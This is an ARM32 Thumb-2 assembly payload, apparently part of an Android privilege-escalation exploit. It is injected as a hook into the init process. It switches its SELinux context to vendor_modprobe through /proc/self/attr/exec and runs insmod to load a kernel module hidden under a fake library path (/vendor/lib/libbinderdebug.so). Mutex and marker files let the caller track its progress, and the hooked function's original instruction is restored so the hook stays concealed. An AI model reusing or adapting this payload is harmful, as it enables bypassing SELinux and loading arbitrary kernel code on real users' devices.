// arm32 (Thumb-2) variant of libcxx.S
//
// Hooked function is compiled as Thumb-2, and the branch that hijacks it stays
// in Thumb state, so the whole payload must be Thumb-2 as well.
// Entered at `libcxx_start`, leaves via the (patched) tail branch back to
// hook+4 after re-executing the stolen original instruction.

    .syntax unified
    .thumb
    .arch armv7-a

    .include "include32.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data


libcxx_data:

mutex_file:
    .asciz "/dev/df"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
attr_exec:
    .asciz "/proc/self/attr/exec"
exe_path:
    .asciz "/vendor/bin/insmod"
exe_path2:
    .asciz "/system/bin/insmod"
step1:  .asciz "/dev/dfw1"
step2:  .asciz "/dev/dfw2"
step3:  .asciz "/dev/dfw3"
step4:  .asciz "/dev/dfw4"
step5:  .asciz "/dev/dfw5"
log_path: .asciz "/dev/dfilog"
ko_target:
    .ascii "/vendor/lib/libbinderdebug.so\0"
    .skip 34, 0                             // pad to 64 bytes — longest candidate path
    .balign 4
    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int ko_target - libcxx_data

    .balign 4

    @ create a marker file so the parent can see how far the payload got.
    @ clobbers r0-r3 and r7 only.
    .macro mark lbl
    mvn     r0, #~AT_FDCWD
    adr     r1, \lbl
    movw    r2, #(O_CREAT|O_WRONLY)         @ 0x0041
    movt    r2, #(O_CLOEXEC >> 16)          @ 0x0008 -> 0x00080041
    movs    r3, #0
    movw    r7, #SYS_openat
    svc     #0
    .endm

libcxx_start:
    push    {r0-r7, lr}                     // save everything we may clobber
    mrs     r12, apsr                       // the hooked insn may read the flags
    push.w  {r12}

    // Detect root uid = 0
    movw    r7, #SYS_getuid
    svc     #0
    cmp     r0, #0
    bne     return

    // Detect init tid = 1
    // We need thread 1 to use the default namespace
    movw    r7, #SYS_gettid
    svc     #0
    cmp     r0, #1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
    mvn     r0, #~AT_FDCWD                  @ r0 = -100
    adr     r1, mutex_file
    movw    r2, #(O_CREAT|O_EXCL)           @ 0x00c0
    movt    r2, #(O_CLOEXEC >> 16)          @ 0x0008  -> 0x000800c0
    movs    r3, #0
    movw    r7, #SYS_openat
    svc     #0

    // return if fail to open (file exist)
    cmp     r0, #0
    blt     return

    sub     sp, sp, #16

    // clone(CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD, 0, NULL, NULL, &ctid)
    // ARM EABI: clone(flags, stack, ptid, tls, ctid) -> r0..r4
    movw    r0, #SIGCHLD                                  @ 0x0011
    movt    r0, #((CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID) >> 16)  @ 0x0120
    movs    r1, #0                          @ stack (0 == fork semantics)
    movs    r2, #0                          @ ptid
    movs    r3, #0                          @ newtls
    add     r4, sp, #8                      @ ctid
    movw    r7, #SYS_clone
    svc     #0
    add     sp, sp, #16

    cmp     r0, #0
    bne     return                          @ parent returns to init

    // ── worker child ──────────────────────────────────────────────────────
    mark    step1
    sub     sp, sp, #16

    // Fork grandchild: set SELinux exec context → execve insmod
    movw    r7, #SYS_fork
    svc     #0
    cmp     r0, #0
    bne     myexit

    // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
    mark    step2

    // insmod's error text would otherwise go to init's /dev/null. Open the log
    // here, while we are still in the init domain, and hand the fds to the
    // exec'd insmod via inheritance (no re-check after the domain switch).
    mvn     r0, #~AT_FDCWD
    adr     r1, log_path
    movw    r2, #(O_CREAT|O_WRONLY|O_TRUNC)     @ 0x0241
    movw    r3, #438                            @ 0666
    movw    r7, #SYS_openat
    svc     #0
    mov     r4, r0
    cmp     r4, #0
    blt     1f
    mov     r0, r4
    movs    r1, #1
    movw    r7, #SYS_dup2
    svc     #0
    mov     r0, r4
    movs    r1, #2
    movw    r7, #SYS_dup2
    svc     #0
    movs    r0, #0
    blt     1f
1:
    // open /proc/self/attr/exec
    mvn     r0, #~AT_FDCWD
    adr     r1, attr_exec
    movw    r2, #O_WRONLY                   @ 0x0001
    movt    r2, #(O_CLOEXEC >> 16)          @ 0x0008 -> 0x00080001
    movs    r3, #0
    movw    r7, #SYS_openat
    svc     #0
    adr     r1, selinux_ctx
    movs    r2, #(selinux_ctx_end - selinux_ctx)
    movs    r7, #SYS_write
    svc     #0

    mark    step3

    // execve("/vendor/bin/insmod", [exe_path, ko_target, NULL], NULL)
    add     r1, sp, #0
    adr     r3, exe_path
    str     r3, [r1, #0]
    adr     r3, ko_target
    str     r3, [r1, #4]
    movs    r3, #0
    str     r3, [r1, #8]
    adr     r0, exe_path
    movs    r2, #0
    movs    r7, #SYS_execve
    svc     #0

    mark    step4          @ execve returned: /vendor/bin/insmod is NOT there

    // Fallback: 32-bit builds often ship toybox insmod instead of vendor insmod
    adr     r3, exe_path2
    add     r1, sp, #0                      @ mark 宏踩过 r1，重新取 argv 数组
    str     r3, [r1, #0]
    adr     r0, exe_path2
    movs    r7, #SYS_execve
    svc     #0

    mark    step5          @ both insmod paths returned: neither exists

myexit:
    movs    r0, #1
    movw    r7, #SYS_exit_group
    svc     #0

return:
    pop.w   {r12}
    msr     apsr_nzcvq, r12
    pop     {r0-r7, lr}

    // Stolen original instruction goes here (exp.c overwrites this slot).
libcxx_first_inst_copy:
    push.w  {r4-r11, lr}

    // Stolen branch back to hook+4 goes here (exp.c overwrites these 4 bytes).
    b.w     libcxx_end

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
